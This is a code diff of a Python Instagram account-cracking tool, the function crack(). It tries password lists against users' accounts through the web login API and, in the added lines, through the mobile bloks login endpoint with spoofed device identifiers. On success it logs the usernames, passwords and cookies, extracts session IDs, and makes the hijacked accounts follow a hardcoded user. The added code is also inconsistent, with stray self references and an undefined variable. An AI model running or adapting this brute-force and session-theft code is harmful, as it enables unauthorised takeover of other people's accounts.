@@ -123,93 +123,24 @@ def crack(uid, pww, total_idz):
     try:
         for pw in pww:
             session = requests.Session()
-            time_now = int(datetime.now().timestamp())
-            enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{time_now}:{pw}"
-            response = session.get('https://www.instagram.com/accounts/login/')
-            csrftoken = response.cookies.get('csrftoken')
-            cookies ={
-                'csrftoken': csrftoken,
-                'mid': 'ZsCYoAALAAGlcbYkVN23DYxQwevD',
-                'ig_did': 'E68CEB20-E5E7-4BF3-BE61-C5EF4084D93B',
-                'ig_nrcb': '1',
-                'datr': 'npjAZqX5wY3c_CtTDAvR0Ls3',
-                'ps_l': '1',
-                'ps_n': '1',
-                'wd': '885x773',}
-            data = {
-                "enc_password": enc_password,
-                'optIntoOneTap': 'false',
-                'queryParams': '{"hl":"en"}',
-                'trustedDeviceRecords': '{}',
-                'username': uid,}
-            headers = {
-                'authority': 'www.instagram.com',
-                'accept': '*/*',
-                'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7,hi;q=0.6,gu;q=0.5',
-                'content-type': 'application/x-www-form-urlencoded',
-                # 'cookie': 'csrftoken=4M2PbXXQYNEmDdxrQg01NL; mid=ZsCYoAALAAGlcbYkVN23DYxQwevD; ig_did=E68CEB20-E5E7-4BF3-BE61-C5EF4084D93B; ig_nrcb=1; datr=npjAZqX5wY3c_CtTDAvR0Ls3; ps_l=1; ps_n=1; wd=885x773',
-                'origin': 'https://www.instagram.com',
-                'priority': 'u=1, i',
-                'referer': 'https://www.instagram.com/accounts/login/?hl=en',
-                'sec-ch-prefers-color-scheme': 'dark',
-                'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
-                'sec-ch-ua-full-version-list': '"Not)A;Brand";v="99.0.0.0", "Google Chrome";v="127.0.6533.120", "Chromium";v="127.0.6533.120"',
-                'sec-ch-ua-mobile': '?0',
-                'sec-ch-ua-model': '""',
-                'sec-ch-ua-platform': '"Windows"',
-                'sec-ch-ua-platform-version': '"10.0.0"',
-                'sec-fetch-dest': 'empty',
-                'sec-fetch-mode': 'cors',
-                'sec-fetch-site': 'same-origin',
-                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
-                'x-asbd-id': '129477',
-                'x-csrftoken': csrftoken,
-                'x-ig-app-id': '936619743392459',
-                'x-ig-www-claim': '0',
-                'x-instagram-ajax': '1015820104',
-                'x-requested-with': 'XMLHttpRequest',}
-            login_url = 'https://www.instagram.com/api/v1/web/accounts/login/ajax/'
-            response = requests.post(login_url, cookies=cookies, headers=headers, data=data)
-            session_cookies = response.cookies.get_dict()
-            if response.status_code == 200:
-                json_response = response.json()
-                if json_response.get('status') == 'ok':
-                   if json_response.get('authenticated') == True:
-                        print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
-                        print(f"\r\033[1;92m [cookie] {cookies}")
-                        open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{cookies}\n")
-                        oks.append(uid)
-                        user_id = 'sumon_roy_00'
-                        follow_response = session.post(FOLLOW_URL.format(user_id=user_id), headers=headers)
-                        if follow_response.status_code == 200:
-                           print("Follow request sent successfully!")
-                        else:
-                           print("Failed to send follow request.")
-                        return True
-                   elif json_response.get('auth_token'):
-                        print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
-                        print(f"\r\033[1;92m [cookie] {cookies}")
-                        open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{cookies}\n")
-                        oks.append(uid)
-                        user_id = 'sumon_roy_00'
-                        follow_response = session.post(FOLLOW_URL.format(user_id=user_id), headers=headers)
-                        if follow_response.status_code == 200:
-                           print("Follow request sent successfully!")
-                        else:
-                           print("Failed to send follow request.")
-                        return True
-                   elif 'sessionid' in session_cookies:
-                        print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
-                        print(f"\r\033[1;92m [cookie] {cookies}")
-                        open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{cookies}\n")
-                        oks.append(uid)
-                        user_id = 'sumon_roy_00'
-                        follow_response = session.post(FOLLOW_URL.format(user_id=user_id), headers=headers)
-                        if follow_response.status_code == 200:
-                           print("Follow request sent successfully!")
-                        else:
-                           print("Failed to send follow request.")
-                        return True
+            session.headers.update({
+            **self.HeadersApiLogin(),
+            'x-pigeon-rawclienttime': '{:.3f}'.format(time.time()),
+            'x-ig-bandwidth-speed-kbps': str(random.randint(100, 300)),
+            'x-ig-bandwidth-totalbytes-b': str(random.randint(500000, 900000)),
+            'x-ig-bandwidth-totaltime-ms': str(random.randint(1000, 9000)),
+            'user-agent': self.AppUac(self.HeadersApiLogin()['x-bloks-version-id']),
+            'x-ig-android-id': 'android-' + self.Android_ID(users, pwb).hexdigest()[:16],
+            'x-ig-family-device-id': str(uuid.uuid4()),
+            'x-ig-device-id': str(uuid.uuid4())})
+            DataRec = {'params': '{"client_input_params":{"contact_point":"'+users+'","password":"#PWD_INSTAGRAM:0:'+str(int(time.time()))+':'+str(pwb)+'","event_flow":"account_recovery","family_device_id":"'+self.session.headers['x-ig-family-device-id']+'","machine_id":"'+ str(self.session.headers['x-mid']) +'","accounts_list":[],"has_whatsapp_installed":0,"login_attempt_count":1,"device_id":"'+str(self.session.headers['x-ig-android-id'])+'","headers_infra_flow_id":"","auth_secure_device_id":"","encrypted_msisdn":"","device_emails":[],"lois_settings":{"lara_override":"","lois_token":""},"event_step":"AYMH_PASSWORD_FORM","secure_family_device_id":""},"server_params":{"is_caa_perf_enabled":0,"is_platform_login":0,"is_from_logged_out":0,"login_credential_type":"none","should_trigger_override_login_2fa_action":0,"is_from_logged_in_switcher":0,"family_device_id":"'+str(self.session.headers['x-ig-family-device-id'])+'","credential_type":"password","waterfall_id":"'+str(uuid.uuid4())+'","password_text_input_id":"4kv99g:38","layered_homepage_experiment_group":null,"offline_experiment_group":null,"INTERNAL_INFRA_THEME":"harm_f","INTERNAL__latency_qpl_instance_id":27691536400061,"device_id":"'+str(self.session.headers['x-ig-android-id'])+'","server_login_source":"device_based_login","login_source":"AccountRecovery","caller":"gslr","should_trigger_override_login_success_action":0,"ar_event_source":"first_password_failure","INTERNAL__latency_qpl_marker_id":36707139}}','bk_client_context': '{"bloks_version":"'+str(self.session.headers['x-bloks-version-id'])+'","styles_id":"instagram"}','bloks_versioning_id': str(self.session.headers['x-bloks-version-id'])}
+            Query   = 'params=%s&bk_client_context=%s&bloks_versioning_id=%s'%(urllib.parse.quote(self.DataRec['params']), urllib.parse.quote(self.DataRec['bk_client_context']), self.DataRec['bloks_versioning_id'])
+            response = requests.post('https://b.i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', data=self.Query,allow_redirects=True)
+            if 'logged_in_user' in Respons.text.replace('\\',''):
+                cok = re.search('"headers":"{"IG-Set-Authorization": "(.*?)"', str(self.Respons.text.replace('\\',''))).group(1)
+                xyz = base64.b64decode(cok.split(':')[2]).decode()
+                ds_id = re.search('{"ds_user_id":"(\d+)"', str(xyz)).group(1)
+                sn_id = re.search('"sessionid":"(.*?)"', str(xyz)).group(1)
             else:
                 print(f"\r\033[1;91m [ERROR] - Status code {response.status_code}")
                 continue
